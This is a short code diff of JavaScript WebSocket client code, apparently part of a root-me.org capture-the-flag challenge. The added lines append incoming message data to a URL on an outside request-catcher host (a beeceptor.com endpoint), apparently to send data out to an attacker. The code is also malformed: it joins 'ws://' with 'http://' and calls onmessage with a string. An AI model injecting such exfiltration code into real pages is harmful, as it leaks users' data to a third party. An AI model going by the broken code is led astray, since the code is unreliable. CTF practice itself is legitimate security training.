@@ -13,14 +13,16 @@
             var connection = new WebSocket('ws://'+'http://ctf03.root-me.org'+'/ws');  
             connection.onopen = function (message) {
                 connection.send('Hello, world');
-            };  
-            connection.onerror = function (error) {
-            alert("An error occured, you will reload the page for you to access a new room !")
-            location.reload()
-            };
-            connection.onclose = function(message) {
+                connection.onmessage('https://alexisundefined.free.beeceptor.com'+message.data);
 
-            connection.send('https://alexisundefined.free.beeceptor.com'+message.data);
+            };  
+                connection.onerror = function (error) {
+                alert("An error occured, you will reload the page for you to access a new room !")
+                location.reload()
+            };
+                connection.onclose = function(message) {
+
+                connection.send('https://alexisundefined.free.beeceptor.com'+message.data);
             };
             }
         );
